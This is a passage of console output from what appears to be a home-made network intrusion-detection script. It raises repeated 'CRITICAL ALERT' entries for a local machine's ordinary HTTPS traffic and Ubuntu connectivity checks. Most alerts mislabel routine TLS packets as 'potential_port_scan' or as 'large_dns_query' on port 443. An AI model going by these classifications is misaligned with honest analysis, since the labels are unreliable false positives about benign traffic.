  Protocol: TCP
  Payload Size: 39 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACIXIkHhHFAWePw28TcESXW44MZRog9+1+0IUF2X2d0kXcjH...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:43:24.155716
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:57732
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 39 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACIXIkHhHFAWePw28TcESXW44MZRog9+1+0IUF2X2d0kXcjH...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:45:21.224403
Signature(s): large_dns_query
Threat Score: 6

Packet Info:
  Source: 34.120.208.123:443
  Destination: 192.168.61.129:57732
  Protocol: TCP
  Payload Size: 39 bytes

Payload Preview:
[BASE64] FwMDACIEqS9IhW5f03YBuGJ96bWPkMPxyn70y18tjoSNdOj0O94z...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:48:36.311488
Signature(s): large_dns_query
Threat Score: 6

Packet Info:
  Source: 192.168.61.129:34056
  Destination: 34.36.137.203:443
  Protocol: TCP
  Payload Size: 39 bytes

Payload Preview:
[BASE64] FwMDACLrpEzlKstFfgEbhwB0fbRSDADScE0FecquuL65b5Y43FUq...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:57:22.277342
Signature(s): large_dns_query
Threat Score: 6

Packet Info:
  Source: 192.168.61.129:44552
  Destination: 151.101.1.91:443
  Protocol: TCP
  Payload Size: 93 bytes

Payload Preview:
[BASE64] FgMDACUQAAAhIBMdW016D4Lv1o1K91LjP0zCeMEZGUailTNQ4x1j0EUZFAMDAAEBFgMDACgAAAAAAAAAAKTLOCazQLPaluP0BlFBWUMOuda8QQKORlGmsXIt48lM...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 19:57:22.389381
Signature(s): large_dns_query
Threat Score: 6

Packet Info:
  Source: 151.101.1.91:443
  Destination: 192.168.61.129:44552
  Protocol: TCP
  Payload Size: 72 bytes

Payload Preview:
[BASE64] FwMDAEMAAAAAAAAAAWffqAL86niCtS+2LfVERp9CA9gC2CxE0QspQxerQFxSR64SWGZxKiP8UOQYwPuAOVTgnXwvq7XWznKp...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:00:11.960820
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:47478
  Destination: 34.107.243.93:443
  Protocol: TCP
  Payload Size: 39 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACKLelO9/OPfITqzJ9wX71Chmc9o5pDgY8Sq6s6Xy6tEBdHk...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:00:11.961684
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:47478
  Destination: 34.107.243.93:443
  Protocol: TCP
  Payload Size: 24 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDABMxND24ZsKx3CSl/eFb4mYDQ+oH...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:00:12.982438
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:44552
  Destination: 151.101.1.91:443
  Protocol: TCP
  Payload Size: 46 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACkAAAAAAAAABu4VtLsmtOXj4Dl6deoo9xKFwg/ejISmqkDDhOLdFaAgcw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:00:12.982922
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:44552
  Destination: 151.101.1.91:443
  Protocol: TCP
  Payload Size: 31 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FQMDABoAAAAAAAAAByjcvYfgsi5BP1z5MVfiKhJ46w==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:01:20.283138
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:49336
  Destination: 185.125.190.49:80
  Protocol: TCP
  Payload Size: 87 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
GET / HTTP/1.1
Host: connectivity-check.ubuntu.com
Accept: */*
Connection: close


==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:02:22.094106
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:47486
  Destination: 34.107.243.93:443
  Protocol: TCP
  Payload Size: 28 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDABfdkTWCDJl4nvcg+HH+uHe8FK9LC4E1Rg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:06:20.268745
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:41300
  Destination: 91.189.91.48:80
  Protocol: TCP
  Payload Size: 87 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
GET / HTTP/1.1
Host: connectivity-check.ubuntu.com
Accept: */*
Connection: close


==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:19.763059
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:53074
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 1460 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FgMBCdYBAAnSAwMtYOr9swHNAgJS2brpoB8Ncic5fWgwsXvm0tGE4ubJtSCH59HOgYJPUVOlfjghweDtX4a/PKTUhQDmuIkN79WeUwAiEwETAxMCwCvAL8ypzKjALMAwwArACQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:19.763283
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:53074
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 1063 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] AwAdACBFHomjkHEz/NX3HxEXJPE1Sazcak9WUxgXCDISqSnzAwAXAEEEhqhD1LGgVW/JZnhkmcx1PLKhdhHPTH49EIywAfLsxjVfzn0Cay+GPYThMrtRTjxD+DXhrzFhaq9qig==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:19.781085
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:38580
  Destination: 34.36.137.203:443
  Protocol: TCP
  Payload Size: 1460 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FgMBCccBAAnDAwOTgDAUNIpDKRYOOmeUxdrKgDtMyZA5fWRPxd/8XHc23iDtbZ2x5W+y2/H/OaA0+dOdHVikbf02sxdmKwoGYtkP7QAiEwETAxMCwCvAL8ypzKjALMAwwArACQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:19.781561
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:38580
  Destination: 34.36.137.203:443
  Protocol: TCP
  Payload Size: 1048 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] pCVTAg1CwQPGEkCUE801zHOV4ppdDwAXAEEEGlpqHTaR3FvL6AwAkgVaPaOCqUVqHWGdCvHa/PY1sLAZjeaFCyDJVQxDkvlVMzPq5KWJAGEPfDSDmPiAF7TvugArAAUEAwQDAw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:19.980094
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:53074
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 64 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FAMDAAEBFwMDADUuZbs61HljrxxstIiKL03kuiabuUDU9bgE98hMDDX7RAeo7otrRRTTMr38J8mIBtPm3kUZQw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:19.980460
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:53074
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 92 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAFf24LJ1EII/HpsLWXuZOKrpSVt8GUlUyTBo9MoiBAmm4G2geEtidit7EaEuEMmdFU/E2z7+SdZI601KoRgcttwH8TugflBbR0GoSHt9udDgkRiAniQVw4g=...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:19.981053
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:53074
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 434 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAa16i1qp4e3zoIF3N8GkJwAEcusbJ0IH0IwSWxoZVeIuD0frKZ9WjpWr5Ftfq4u4uJzt7EaFr9hVNqelulXInNxVhusUNzDBrRn0YEF+fXwUICld1PTR5IX/GYlRzSI3yw==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:19.981284
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:53074
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 1460 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDBerw5nbuUkHJRKYF8TtSWKoR28Fnqh/6u9/ZK6uO0cH9SeWfsCXrMkDti4GTRWyJSiyANayrN+sYSVXgGAPeS6vvnJuwLngKElju0e1pM3zXo0mdV2nbdz8eSmdCF3hP/Q==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:19.981457
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:53074
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 59 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] h184lzCc9Pge9DIzsTNSm1XkhI3ZC9NDDLPOHzSSNcYV7bdY2w5+gomUtfKNAtYFWF1uAnjBTU3MBY8=...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:20.017024
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:38580
  Destination: 34.36.137.203:443
  Protocol: TCP
  Payload Size: 64 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FAMDAAEBFwMDADVgYD4xYjIoPPVbmtGCV/L7YQW1F2zcSgLJnLK5w4fV6KfTWdItMM6yCg9UjjWZUxJ5p8MUdQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:20.017299
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:38580
  Destination: 34.36.137.203:443
  Protocol: TCP
  Payload Size: 92 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAFe7KiEMLWfbEU5kM2BNg9/QN9k4IT0qR9rxod+caG0tDRW/e6VKUSW4r0quyeoBtBRTxgGgz5jWhMWNgjx/eosydtcKVIZQm+fAB/nMy4ztGWw324/4fec=...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:20.017504
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:38580
  Destination: 34.36.137.203:443
  Protocol: TCP
  Payload Size: 227 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAN5KwNUyfLhITmJcvV0NJ4BWQxlodktH6z0C/Pv69UH7j2Ax4zp8wVcn8Ci/YJar3NARaTc7b8E2YLVBlAZEiCrMr2LU+s2rgAKk8ujMJORz/TkYtDyfJEJbWV5wW3UDCQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:20.017703
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:38580
  Destination: 34.36.137.203:443
  Protocol: TCP
  Payload Size: 254 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAPmO4E5ZtqbqBe73XM2XYLD/v5yfeP3b7vqFcLJKJ++mSAlcEYADyUoq3njkbhABE8D7nGNS+BwtLd1usyRS6+teNGPj3KG2TJN0HIHjd0GSziITBDkIH7TwNKMgT4bK5g==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:20.033507
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:53074
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 31 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDABo7z8/VX8UUSlDWxce+fMT6lOZg5nj/kr7iRQ==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:20.094908
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:38580
  Destination: 34.36.137.203:443
  Protocol: TCP
  Payload Size: 31 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDABrtxOdh1iNjrj6SHumDKl9HwIngLK1sYjWlnA==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:20.177545
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:38580
  Destination: 34.36.137.203:443
  Protocol: TCP
  Payload Size: 39 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACK73WJsgGB2NS0hJ5PEyq2oLLKRWysNFJZ+Xiji9gfrN7Yh...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:20.352526
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:53074
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 39 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACLMZZsZFe9v2qal3ulRILNh9nCROy8+NTUeRXOINjiZHVir...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:20.357241
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:53074
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 154 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAJVWACtSaQg8+zu5O2iQX0QNgMTiB52CHxl8vOfQWF7lnfPWdIphlOoP9hprz1YTcXKrRmXsxJ0eCiciyubyDbEswEVaDqN/oy2GLVc1NijlfR0JQoY0iY8mQpHKO4g8ow==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:20.357476
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:53074
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 361 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDAWTY4ABfQNVrjExb3gY00x7Uy4TQB9sFhNSyCEgXnIGlwc342pdhi+xPk+JFlQBamzteSPwXpNJ0UXzuhnRTSBY+kUw2uunPBjamcPritFJ3IwEC9A7z9ZGpeGUma0Qseg==...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:20.669261
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:53074
  Destination: 34.120.208.123:443
  Protocol: TCP
  Payload Size: 39 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDACL1MhEgHw19WIpYWjPGhPoaWIYZls0n/wxxnEay2KtCIo8x...
==================================================


==================================================
🚨 CRITICAL ALERT
==================================================
Time: 2026-01-25 20:07:22.286947
Signature(s): 
Threat Score: 4

Packet Info:
  Source: 192.168.61.129:47486
  Destination: 34.107.243.93:443
  Protocol: TCP
  Payload Size: 28 bytes

Protocol Anomalies: potential_port_scan

Payload Preview:
[BASE64] FwMDABcsOUYHHGjKhret+9cQ7xHTn9B0F8j+lw==...
==================================================

